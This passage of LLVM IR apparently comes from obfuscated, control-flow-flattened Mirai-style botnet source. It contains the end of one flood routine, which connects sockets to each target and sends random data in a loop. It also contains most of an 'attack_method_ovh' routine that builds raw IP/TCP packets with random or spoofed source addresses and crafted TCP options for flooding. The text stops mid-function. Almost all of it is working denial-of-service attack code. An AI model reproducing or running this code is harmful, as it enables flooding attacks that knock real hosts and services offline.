  %109 = load i32, i32* %9, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i32, i32* %108, i64 %110
  %112 = load i32, i32* %111, align 4
  %113 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %114 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %114, %struct.sockaddr** %113, align 8
  %115 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %116 = load %struct.sockaddr*, %struct.sockaddr** %115, align 8
  %117 = call i32 @bind(i32 %112, %struct.sockaddr* %116, i32 16) #6
  %118 = icmp eq i32 %117, -1
  %119 = select i1 %118, i32 -455398101, i32 -840961744
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 -840961744, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %123 = load i32, i32* %9, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %122, i64 %124
  %126 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %125, i32 0, i32 2
  %127 = load i8, i8* %126, align 4
  %128 = zext i8 %127 to i32
  %129 = icmp slt i32 %128, 32
  %130 = select i1 %129, i32 -1621336561, i32 -449932006
  store i32 %130, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  %132 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i64 %134
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i32 0, i32 1
  %137 = load i32, i32* %136, align 4
  %138 = call i32 @ntohl(i32 %137) #7
  %139 = call i32 @rand_next()
  %140 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %141 = load i32, i32* %9, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %140, i64 %142
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %143, i32 0, i32 2
  %145 = load i8, i8* %144, align 4
  %146 = zext i8 %145 to i32
  %147 = lshr i32 %139, %146
  %148 = add i32 %138, %147
  %149 = call i32 @htonl(i32 %148) #7
  %150 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %151 = load i32, i32* %9, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i64 %152
  %154 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %153, i32 0, i32 0
  %155 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %154, i32 0, i32 2
  %156 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %155, i32 0, i32 0
  store i32 %149, i32* %156, align 4
  store i32 -449932006, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i32*, i32** %11, align 8
  %159 = load i32, i32* %9, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds i32, i32* %158, i64 %160
  %162 = load i32, i32* %161, align 4
  %163 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i32 0, i32 0
  %169 = bitcast %struct.sockaddr_in* %168 to %struct.sockaddr*
  store %struct.sockaddr* %169, %struct.sockaddr** %163, align 8
  %170 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %171 = load %struct.sockaddr*, %struct.sockaddr** %170, align 8
  %172 = call i32 @connect(i32 %162, %struct.sockaddr* %171, i32 16)
  %173 = icmp eq i32 %172, -1
  %174 = select i1 %173, i32 516593212, i32 1933135807
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 1933135807, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 -1771727602, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i32, i32* %9, align 4
  %179 = add nsw i32 %178, 1
  store i32 %179, i32* %9, align 4
  store i32 -744817425, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  store i32 784006158, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -2138393546, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load i32, i32* %9, align 4
  %184 = load i8, i8* %5, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp slt i32 %183, %185
  %187 = select i1 %186, i32 1352895329, i32 195655257
  store i32 %187, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i8**, i8*** %10, align 8
  %190 = load i32, i32* %9, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds i8*, i8** %189, i64 %191
  %193 = load i8*, i8** %192, align 8
  store i8* %193, i8** %22, align 8
  %194 = load i8, i8* %15, align 1
  %195 = icmp ne i8 %194, 0
  %196 = select i1 %195, i32 1024500314, i32 -17429451
  store i32 %196, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  %198 = load i8*, i8** %22, align 8
  %199 = load i16, i16* %14, align 2
  %200 = zext i16 %199 to i32
  call void @rand_str(i8* %198, i32 %200)
  store i32 -17429451, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = load i32*, i32** %11, align 8
  %203 = load i32, i32* %9, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds i32, i32* %202, i64 %204
  %206 = load i32, i32* %205, align 4
  %207 = load i8*, i8** %22, align 8
  %208 = load i16, i16* %14, align 2
  %209 = zext i16 %208 to i64
  %210 = call i64 @send(i32 %206, i8* %207, i64 %209, i32 16384)
  store i32 215208490, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  %212 = load i32, i32* %9, align 4
  %213 = add nsw i32 %212, 1
  store i32 %213, i32* %9, align 4
  store i32 -2138393546, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  store i32 784006158, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %214, %211, %201, %197, %188, %182, %181, %180, %177, %176, %175, %157, %131, %121, %120, %102, %93, %84, %75, %65, %59, %58, %55, %52, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_ovh(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -300922799, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -300922799, label %first
    i32 1435923635, label %99
    i32 -334851505, label %100
    i32 1280595840, label %106
    i32 1401537014, label %109
    i32 352605991, label %110
    i32 -1460291838, label %116
    i32 1234666890, label %160
    i32 1399829245, label %164
    i32 -495177574, label %289
    i32 2082071276, label %292
    i32 813740471, label %293
    i32 526682558, label %294
    i32 -58408482, label %300
    i32 -850893603, label %320
    i32 1973259924, label %341
    i32 -1152877173, label %345
    i32 -1740257863, label %349
    i32 -1487345175, label %354
    i32 1676267580, label %360
    i32 1636775838, label %365
    i32 951709869, label %371
    i32 1286601770, label %376
    i32 -1472267692, label %382
    i32 682546248, label %386
    i32 -83745962, label %390
    i32 1163993203, label %394
    i32 1144676156, label %398
    i32 1473234629, label %402
    i32 864270942, label %408
    i32 -1749921190, label %446
    i32 322437427, label %449
    i32 -1597578937, label %450
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %97 = icmp eq i32 %.reload, -1
  %98 = select i1 %97, i32 1435923635, i32 -334851505
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  store i32 -1597578937, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %101 = load i32, i32* %10, align 4
  %102 = bitcast i32* %9 to i8*
  %103 = call i32 @setsockopt(i32 %101, i32 0, i32 3, i8* %102, i32 4) #6
  %104 = icmp eq i32 %103, -1
  %105 = select i1 %104, i32 1280595840, i32 1401537014
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %10, align 4
  %108 = call i32 @close(i32 %107)
  store i32 -1597578937, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 352605991, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* %9, align 4
  %112 = load i8, i8* %5, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp slt i32 %111, %113
  %115 = select i1 %114, i32 -1460291838, i32 2082071276
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = call noalias i8* @calloc(i64 128, i64 1) #6
  %118 = load i8**, i8*** %11, align 8
  %119 = load i32, i32* %9, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8*, i8** %118, i64 %120
  store i8* %117, i8** %121, align 8
  %122 = load i8**, i8*** %11, align 8
  %123 = load i32, i32* %9, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds i8*, i8** %122, i64 %124
  %126 = load i8*, i8** %125, align 8
  %127 = bitcast i8* %126 to %struct.iphdr*
  store %struct.iphdr* %127, %struct.iphdr** %27, align 8
  %128 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i64 1
  %130 = bitcast %struct.iphdr* %129 to %struct.tcphdr*
  store %struct.tcphdr* %130, %struct.tcphdr** %28, align 8
  %131 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %132 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %131, i64 1
  %133 = bitcast %struct.tcphdr* %132 to i8*
  store i8* %133, i8** %29, align 8
  %134 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %135 = bitcast %struct.iphdr* %134 to i8*
  %136 = load i8, i8* %135, align 4
  %137 = and i8 %136, 15
  %138 = or i8 %137, 64
  store i8 %138, i8* %135, align 4
  %139 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %140 = bitcast %struct.iphdr* %139 to i8*
  %141 = load i8, i8* %140, align 4
  %142 = and i8 %141, -16
  %143 = or i8 %142, 5
  store i8 %143, i8* %140, align 4
  %144 = load i8, i8* %12, align 1
  %145 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 1
  store i8 %144, i8* %146, align 1
  %147 = call zeroext i16 @htons(i16 zeroext 60) #7
  %148 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 2
  store i16 %147, i16* %149, align 2
  %150 = load i16, i16* %13, align 2
  %151 = call zeroext i16 @htons(i16 zeroext %150) #7
  %152 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 3
  store i16 %151, i16* %153, align 4
  %154 = load i8, i8* %14, align 1
  %155 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 5
  store i8 %154, i8* %156, align 4
  %157 = load i8, i8* %15, align 1
  %158 = icmp ne i8 %157, 0
  %159 = select i1 %158, i32 1234666890, i32 1399829245
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %162 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 4
  store i16 %161, i16* %163, align 2
  store i32 1399829245, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 6
  store i8 6, i8* %166, align 1
  %167 = load i32, i32* %26, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 8
  store i32 %167, i32* %169, align 4
  %170 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %171 = load i32, i32* %9, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i64 %172
  %174 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i32 0, i32 1
  %175 = load i32, i32* %174, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 9
  store i32 %175, i32* %177, align 4
  %178 = load i16, i16* %16, align 2
  %179 = call zeroext i16 @htons(i16 zeroext %178) #7
  %180 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %181 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %180, i32 0, i32 0
  store i16 %179, i16* %181, align 4
  %182 = load i16, i16* %17, align 2
  %183 = call zeroext i16 @htons(i16 zeroext %182) #7
  %184 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %185 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %184, i32 0, i32 1
  store i16 %183, i16* %185, align 2
  %186 = load i32, i32* %18, align 4
  %187 = trunc i32 %186 to i16
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = zext i16 %188 to i32
  %190 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 2
  store i32 %189, i32* %191, align 4
  %192 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 4
  %194 = load i16, i16* %193, align 4
  %195 = and i16 %194, -241
  %196 = or i16 %195, 160
  store i16 %196, i16* %193, align 4
  %197 = load i8, i8* %20, align 1
  %198 = sext i8 %197 to i16
  %199 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %200 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %199, i32 0, i32 4
  %201 = load i16, i16* %200, align 4
  %202 = and i16 %198, 1
  %203 = shl i16 %202, 13
  %204 = and i16 %201, -8193
  %205 = or i16 %204, %203
  store i16 %205, i16* %200, align 4
  %206 = load i8, i8* %21, align 1
  %207 = sext i8 %206 to i16
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 4
  %210 = load i16, i16* %209, align 4
  %211 = and i16 %207, 1
  %212 = shl i16 %211, 12
  %213 = and i16 %210, -4097
  %214 = or i16 %213, %212
  store i16 %214, i16* %209, align 4
  %215 = load i8, i8* %22, align 1
  %216 = sext i8 %215 to i16
  %217 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %218 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %217, i32 0, i32 4
  %219 = load i16, i16* %218, align 4
  %220 = and i16 %216, 1
  %221 = shl i16 %220, 11
  %222 = and i16 %219, -2049
  %223 = or i16 %222, %221
  store i16 %223, i16* %218, align 4
  %224 = load i8, i8* %23, align 1
  %225 = sext i8 %224 to i16
  %226 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 4
  %228 = load i16, i16* %227, align 4
  %229 = and i16 %225, 1
  %230 = shl i16 %229, 10
  %231 = and i16 %228, -1025
  %232 = or i16 %231, %230
  store i16 %232, i16* %227, align 4
  %233 = load i8, i8* %24, align 1
  %234 = sext i8 %233 to i16
  %235 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 4
  %237 = load i16, i16* %236, align 4
  %238 = and i16 %234, 1
  %239 = shl i16 %238, 9
  %240 = and i16 %237, -513
  %241 = or i16 %240, %239
  store i16 %241, i16* %236, align 4
  %242 = load i8, i8* %25, align 1
  %243 = sext i8 %242 to i16
  %244 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 4
  %246 = load i16, i16* %245, align 4
  %247 = and i16 %243, 1
  %248 = shl i16 %247, 8
  %249 = and i16 %246, -257
  %250 = or i16 %249, %248
  store i16 %250, i16* %245, align 4
  %251 = load i8*, i8** %29, align 8
  %252 = getelementptr inbounds i8, i8* %251, i32 1
  store i8* %252, i8** %29, align 8
  store i8 2, i8* %251, align 1
  %253 = load i8*, i8** %29, align 8
  %254 = getelementptr inbounds i8, i8* %253, i32 1
  store i8* %254, i8** %29, align 8
  store i8 4, i8* %253, align 1
  %255 = call i32 @rand_next()
  %256 = and i32 %255, 15
  %257 = add i32 1400, %256
  %258 = trunc i32 %257 to i16
  %259 = call zeroext i16 @htons(i16 zeroext %258) #7
  %260 = load i8*, i8** %29, align 8
  %261 = bitcast i8* %260 to i16*
  store i16 %259, i16* %261, align 2
  %262 = load i8*, i8** %29, align 8
  %263 = getelementptr inbounds i8, i8* %262, i64 2
  store i8* %263, i8** %29, align 8
  %264 = load i8*, i8** %29, align 8
  %265 = getelementptr inbounds i8, i8* %264, i32 1
  store i8* %265, i8** %29, align 8
  store i8 4, i8* %264, align 1
  %266 = load i8*, i8** %29, align 8
  %267 = getelementptr inbounds i8, i8* %266, i32 1
  store i8* %267, i8** %29, align 8
  store i8 2, i8* %266, align 1
  %268 = load i8*, i8** %29, align 8
  %269 = getelementptr inbounds i8, i8* %268, i32 1
  store i8* %269, i8** %29, align 8
  store i8 8, i8* %268, align 1
  %270 = load i8*, i8** %29, align 8
  %271 = getelementptr inbounds i8, i8* %270, i32 1
  store i8* %271, i8** %29, align 8
  store i8 10, i8* %270, align 1
  %272 = call i32 @rand_next()
  %273 = load i8*, i8** %29, align 8
  %274 = bitcast i8* %273 to i32*
  store i32 %272, i32* %274, align 4
  %275 = load i8*, i8** %29, align 8
  %276 = getelementptr inbounds i8, i8* %275, i64 4
  store i8* %276, i8** %29, align 8
  %277 = load i8*, i8** %29, align 8
  %278 = bitcast i8* %277 to i32*
  store i32 0, i32* %278, align 4
  %279 = load i8*, i8** %29, align 8
  %280 = getelementptr inbounds i8, i8* %279, i64 4
  store i8* %280, i8** %29, align 8
  %281 = load i8*, i8** %29, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %29, align 8
  store i8 1, i8* %281, align 1
  %283 = load i8*, i8** %29, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %29, align 8
  store i8 3, i8* %283, align 1
  %285 = load i8*, i8** %29, align 8
  %286 = getelementptr inbounds i8, i8* %285, i32 1
  store i8* %286, i8** %29, align 8
  store i8 3, i8* %285, align 1
  %287 = load i8*, i8** %29, align 8
  %288 = getelementptr inbounds i8, i8* %287, i32 1
  store i8* %288, i8** %29, align 8
  store i8 6, i8* %287, align 1
  store i32 -495177574, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = load i32, i32* %9, align 4
  %291 = add nsw i32 %290, 1
  store i32 %291, i32* %9, align 4
  store i32 352605991, i32* %switchVar
  br label %loopEnd

; <label>:292:                                    ; preds = %loopEntry
  store i32 813740471, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 526682558, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i32, i32* %9, align 4
  %296 = load i8, i8* %5, align 1
  %297 = zext i8 %296 to i32
  %298 = icmp slt i32 %295, %297
  %299 = select i1 %298, i32 -58408482, i32 322437427
  store i32 %299, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  %301 = load i8**, i8*** %11, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8*, i8** %301, i64 %303
  %305 = load i8*, i8** %304, align 8
  store i8* %305, i8** %30, align 8
  %306 = load i8*, i8** %30, align 8
  %307 = bitcast i8* %306 to %struct.iphdr*
  store %struct.iphdr* %307, %struct.iphdr** %31, align 8
  %308 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %309 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %308, i64 1
  %310 = bitcast %struct.iphdr* %309 to %struct.tcphdr*
  store %struct.tcphdr* %310, %struct.tcphdr** %32, align 8
  %311 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i32 0, i32 2
  %316 = load i8, i8* %315, align 4
  %317 = zext i8 %316 to i32
  %318 = icmp slt i32 %317, 32
  %319 = select i1 %318, i32 -850893603, i32 1973259924
  store i32 %319, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %322 = load i32, i32* %9, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %321, i64 %323
  %325 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %324, i32 0, i32 1
  %326 = load i32, i32* %325, align 4
  %327 = call i32 @ntohl(i32 %326) #7
  %328 = call i32 @rand_next()
  %329 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %332, i32 0, i32 2
  %334 = load i8, i8* %333, align 4
  %335 = zext i8 %334 to i32
  %336 = lshr i32 %328, %335
  %337 = add i32 %327, %336
  %338 = call i32 @htonl(i32 %337) #7
  %339 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 9
  store i32 %338, i32* %340, align 4
  store i32 1973259924, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = load i32, i32* %26, align 4
  %343 = icmp eq i32 %342, -1
  %344 = select i1 %343, i32 -1152877173, i32 -1740257863
  store i32 %344, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = call i32 @rand_next()
  %347 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 8
  store i32 %346, i32* %348, align 4
